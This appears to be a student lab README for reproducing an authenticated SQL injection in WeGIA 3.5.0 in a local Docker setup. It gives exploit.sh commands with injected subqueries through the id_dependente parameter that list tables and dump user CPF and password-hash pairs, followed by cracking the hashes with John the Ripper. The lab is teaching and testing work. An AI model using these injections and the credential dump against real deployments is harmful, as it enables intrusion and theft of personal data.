# WeGIA 3.5.0 SQL Injection Lab (CS4177)

**Course:** CS4177 · **Team:** BackLeft (CJ, Sami, Tavo)  
**Topic:** SQL injection in WeGIA — **authorized local environment only**  
**CVE (instructor identifier):** CVE-2025-62360  

Do not use this lab against systems you do not own. Run it only in your own Docker stack.

---

## What you need installed

| Tool | Purpose |
|------|--------|
| **Docker Desktop** (Mac/Windows) or **Docker Engine + Compose** (Linux) | Runs PHP + MariaDB |
| **Git** | Clone this repo and WeGIA |
| **John the Ripper** | Crack extracted hashes offline (optional for the injection demo alone) |

### Docker install (simple)

1. **Windows (10/11):** install Docker Desktop  
   <https://docs.docker.com/desktop/setup/install/windows-install/>
2. **Mac (Intel or Apple Silicon):** install Docker Desktop  
   <https://docs.docker.com/desktop/setup/install/mac-install/>
3. **Linux:** install Docker Engine + Compose plugin  
   <https://docs.docker.com/engine/install/>
4. Restart your computer after install.
5. Verify in terminal:

```bash
docker --version
docker compose version
```

**John the Ripper**

- macOS: `brew install john-jumbo`
- Ubuntu/Debian: `sudo apt update && sudo apt install -y john`
- Windows: [Openwall John](https://www.openwall.com/john/) (jumbo build)

---

## Quick path

### 1. Clone this repository

```bash
git clone https://github.com/samiodeh35/cs4177-wegie-lab.git
cd cs4177-wegie-lab
```

Do the next steps from the folder that contains `docker-compose.yml` and `WeGIA/` (same level).

### 2. Start containers

```bash
docker compose up -d
```

Wait **30–60 seconds** on first start for MariaDB. Confirm:

```bash
docker compose ps
```

You want `wegia-web` and `wegia-db` **running**. The SQL import script talks to the `db` service — it will fail if you skip this step.

### 3. First-time database (installer)

Open: **h**

| Field (Portuguese) | Value |
|--------------------|--------|
| Nome do BD | `wegia` |
| Host do BD | `db` |
| Usuario do BD | `wegia` |
| Senha do BD | `wegia` |
| Caminho para a pasta de Backups | `/tmp` |
| Domínio do site (url) | `http://127.0.0.1:8080/WeGIA/` |

If you see:

Base de dados já existe!

You're all set!

Next run:

```bash
./docker/import-wegia-sql.sh
```

Then run the installer again if needed.

### 4. Log in

**http://127.0.0.1:8080/WeGIA/**

- Username (CPF field): `admin`  
- Password: `wegia`

### 5. Seed one dependent row (for realistic JSON from the vulnerable endpoint)

```bash
docker exec -it wegia-db mariadb -u wegia -pwegia wegia -e "INSERT INTO funcionario_dependentes (id_funcionario, id_pessoa, id_parentesco) VALUES (1,1,1);"
```

Duplicate key error is OK — a row may already exist.

### 6. Run the proof-of-concept exploit

```bash
chmod +x exploit.sh
./exploit.sh "http://127.0.0.1:8080/WeGIA" "admin" "wegia" "version()"
./exploit.sh "http://127.0.0.1:8080/WeGIA" "admin" "wegia" "database()"
```

Vulnerable URL (POST): `.../html/funcionario/dependente_documento.php` — parameter `id_dependente`. You must be logged in; `exploit.sh` saves the session cookie and reuses it.

### 7. Pull hashes and crack with John (full attack chain)

Table names differ by WeGIA version. List tables in `wegia`, then pick the one that holds logins (often `pessoa` in the bundled `wegia001.sql` / `wegia002.sql`, not `usuarios`):

```bash
./exploit.sh "http://127.0.0.1:8080/WeGIA" "admin" "wegia" \
  "(SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema='wegia')"
```

For this lab’s default dumps, credentials live on **`pessoa`** (`cpf`, `senha`):

```bash
./exploit.sh "http://127.0.0.1:8080/WeGIA" "admin" "wegia" \
  "(SELECT GROUP_CONCAT(cpf, ':', senha SEPARATOR ';') FROM pessoa)"
```

Save each `username:hash` line to `hashes.txt`, then:

```bash
john --format=Raw-SHA256 hashes.txt
john --show --format=Raw-SHA256 hashes.txt
```

---

## Technical notes (short)

- **PHP 7.4** in Compose matches this codebase; PHP 8.x often breaks login.
- **Fix:** validate `id_dependente` as an integer, use prepared statements / bound parameters — never concatenate user input into SQL.
- **Cleanup (wipe DB volume):** `docker compose down -v`

---

## References

- [WeGIA](https://github.com/nilsonmori/WeGIA)  
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)  
- [Docker](https://docs.docker.com/get-docker/)  
- [John the Ripper](https://www.openwall.com/john/) this is what i have now
